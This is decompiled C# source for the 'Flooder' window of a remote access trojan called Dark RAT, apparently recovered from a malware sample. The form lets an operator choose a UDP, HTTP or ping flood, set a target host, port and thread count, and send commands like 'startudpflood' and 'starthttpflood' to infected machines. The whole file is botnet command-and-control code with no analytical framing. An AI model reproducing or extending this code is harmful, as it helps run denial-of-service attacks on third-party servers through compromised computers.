// Decompiled with JetBrains decompiler
// Type: Dark_RAT.flood
// Assembly: Dark RAT, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C824395-872F-43D5-A237-CC243F82B456
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Flooder.gen-66512a2c31adfe77fb66c2c824e55509ba2cce70d158e850f0e56e3dc664f420.exe

using Dark_RAT.My;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace Dark_RAT
{
  [DesignerGenerated]
  public class flood : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("ComboBox1")]
    private ComboBox _ComboBox1;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("NumericUpDown1")]
    private NumericUpDown _NumericUpDown1;
    [AccessedThroughProperty("TextBox2")]
    private TextBox _TextBox2;
    [AccessedThroughProperty("Button2")]
    private Button _Button2;

    [DebuggerNonUserCode]
    static flood()
    {
    }

    [DebuggerNonUserCode]
    public flood()
    {
      this.Load += new EventHandler(this.flood_Load);
      flood.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (flood.__ENCList)
      {
        if (flood.__ENCList.Count == flood.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (flood.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (flood.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                flood.__ENCList[index1] = flood.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          flood.__ENCList.RemoveRange(index1, checked (flood.__ENCList.Count - index1));
          flood.__ENCList.Capacity = flood.__ENCList.Count;
        }
        flood.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (flood));
      this.ComboBox1 = new ComboBox();
      this.TextBox1 = new TextBox();
      this.Button1 = new Button();
      this.NumericUpDown1 = new NumericUpDown();
      this.TextBox2 = new TextBox();
      this.Button2 = new Button();
      this.NumericUpDown1.BeginInit();
      this.SuspendLayout();
      this.ComboBox1.FormattingEnabled = true;
      this.ComboBox1.Items.AddRange(new object[3]
      {
        (object) "UDP",
        (object) "HTTP",
        (object) "PING"
      });
      ComboBox comboBox1_1 = this.ComboBox1;
      Point point1 = new Point(12, 12);
      Point point2 = point1;
      comboBox1_1.Location = point2;
      this.ComboBox1.Name = "ComboBox1";
      ComboBox comboBox1_2 = this.ComboBox1;
      Size size1 = new Size(91, 21);
      Size size2 = size1;
      comboBox1_2.Size = size2;
      this.ComboBox1.TabIndex = 0;
      TextBox textBox1_1 = this.TextBox1;
      point1 = new Point(109, 12);
      Point point3 = point1;
      textBox1_1.Location = point3;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      size1 = new Size(155, 20);
      Size size3 = size1;
      textBox1_2.Size = size3;
      this.TextBox1.TabIndex = 1;
      this.TextBox1.Text = "127.0.0.1";
      this.Button1.Image = (Image) componentResourceManager.GetObject("Button1.Image");
      this.Button1.ImageAlign = ContentAlignment.BottomLeft;
      Button button1_1 = this.Button1;
      point1 = new Point(383, 10);
      Point point4 = point1;
      button1_1.Location = point4;
      this.Button1.Name = "Button1";
      Button button1_2 = this.Button1;
      size1 = new Size(75, 23);
      Size size4 = size1;
      button1_2.Size = size4;
      this.Button1.TabIndex = 3;
      this.Button1.Text = "START";
      this.Button1.UseVisualStyleBackColor = true;
      NumericUpDown numericUpDown1_1 = this.NumericUpDown1;
      point1 = new Point(270, 12);
      Point point5 = point1;
      numericUpDown1_1.Location = point5;
      NumericUpDown numericUpDown1_2 = this.NumericUpDown1;
      Decimal num1 = new Decimal(new int[4]
      {
        9999,
        0,
        0,
        0
      });
      Decimal num2 = num1;
      numericUpDown1_2.Maximum = num2;
      NumericUpDown numericUpDown1_3 = this.NumericUpDown1;
      num1 = new Decimal(new int[4]{ 1, 0, 0, 0 });
      Decimal num3 = num1;
      numericUpDown1_3.Minimum = num3;
      this.NumericUpDown1.Name = "NumericUpDown1";
      NumericUpDown numericUpDown1_4 = this.NumericUpDown1;
      size1 = new Size(61, 20);
      Size size5 = size1;
      numericUpDown1_4.Size = size5;
      this.NumericUpDown1.TabIndex = 4;
      NumericUpDown numericUpDown1_5 = this.NumericUpDown1;
      num1 = new Decimal(new int[4]{ 80, 0, 0, 0 });
      Decimal num4 = num1;
      numericUpDown1_5.Value = num4;
      TextBox textBox2_1 = this.TextBox2;
      point1 = new Point(337, 12);
      Point point6 = point1;
      textBox2_1.Location = point6;
      this.TextBox2.Name = "TextBox2";
      TextBox textBox2_2 = this.TextBox2;
      size1 = new Size(40, 20);
      Size size6 = size1;
      textBox2_2.Size = size6;
      this.TextBox2.TabIndex = 5;
      this.TextBox2.Text = "10";
      this.Button2.Image = (Image) componentResourceManager.GetObject("Button2.Image");
      Button button2_1 = this.Button2;
      point1 = new Point(464, 10);
      Point point7 = point1;
      button2_1.Location = point7;
      this.Button2.Name = "Button2";
      Button button2_2 = this.Button2;
      size1 = new Size(35, 23);
      Size size7 = size1;
      button2_2.Size = size7;
      this.Button2.TabIndex = 6;
      this.Button2.UseVisualStyleBackColor = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      size1 = new Size(508, 44);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Button2);
      this.Controls.Add((Control) this.TextBox2);
      this.Controls.Add((Control) this.NumericUpDown1);
      this.Controls.Add((Control) this.Button1);
      this.Controls.Add((Control) this.TextBox1);
      this.Controls.Add((Control) this.ComboBox1);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.MaximizeBox = false;
      this.Name = nameof (flood);
      this.Text = "Flooder";
      this.NumericUpDown1.EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    protected virtual ComboBox ComboBox1
    {
      [DebuggerNonUserCode] get => this._ComboBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ComboBox1_SelectedIndexChanged);
        if (this._ComboBox1 != null)
          this._ComboBox1.SelectedIndexChanged -= eventHandler;
        this._ComboBox1 = value;
        if (this._ComboBox1 == null)
          return;
        this._ComboBox1.SelectedIndexChanged += eventHandler;
      }
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual Button Button1
    {
      [DebuggerNonUserCode] get => this._Button1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        if (this._Button1 != null)
          this._Button1.Click -= eventHandler;
        this._Button1 = value;
        if (this._Button1 == null)
          return;
        this._Button1.Click += eventHandler;
      }
    }

    internal virtual NumericUpDown NumericUpDown1
    {
      [DebuggerNonUserCode] get => this._NumericUpDown1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._NumericUpDown1 = value;
    }

    internal virtual TextBox TextBox2
    {
      [DebuggerNonUserCode] get => this._TextBox2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox2 = value;
    }

    internal virtual Button Button2
    {
      [DebuggerNonUserCode] get => this._Button2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button2_Click);
        if (this._Button2 != null)
          this._Button2.Click -= eventHandler;
        this._Button2 = value;
        if (this._Button2 == null)
          return;
        this._Button2.Click += eventHandler;
      }
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.ComboBox1.Text, "UDP", false) == 0)
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|startudpflood|" + this.TextBox1.Text + "|" + Conversions.ToString(this.NumericUpDown1.Value) + "|" + this.TextBox2.Text));
      if (Operators.CompareString(this.ComboBox1.Text, "HTTP", false) == 0)
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|starthttpflood|" + this.TextBox1.Text + "|" + this.TextBox2.Text));
      if (Operators.CompareString(this.ComboBox1.Text, "PING", false) != 0)
        return;
      MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|startping|" + this.TextBox1.Text + "|" + this.TextBox2.Text));
    }

    private void ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.ComboBox1.Text, "UDP", false) == 0)
      {
        this.TextBox1.Enabled = true;
        this.TextBox1.Text = "127.0.0.1";
        this.TextBox2.Enabled = true;
        this.NumericUpDown1.Enabled = true;
        this.Button2.Enabled = false;
      }
      if (Operators.CompareString(this.ComboBox1.Text, "HTTP", false) == 0)
      {
        this.TextBox1.Enabled = true;
        this.TextBox1.Text = "http://google.com";
        this.TextBox2.Enabled = true;
        this.NumericUpDown1.Enabled = false;
        this.Button2.Enabled = true;
      }
      if (Operators.CompareString(this.ComboBox1.Text, "PING", false) != 0)
        return;
      this.TextBox1.Enabled = true;
      this.TextBox1.Text = "127.0.0.1";
      this.TextBox2.Enabled = true;
      this.NumericUpDown1.Enabled = false;
      this.Button2.Enabled = false;
    }

    private void flood_Load(object sender, EventArgs e)
    {
    }

    private void Button2_Click(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.ComboBox1.Text, "HTTP", false) != 0)
        return;
      MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|stophttpflood|"));
    }
  }
}
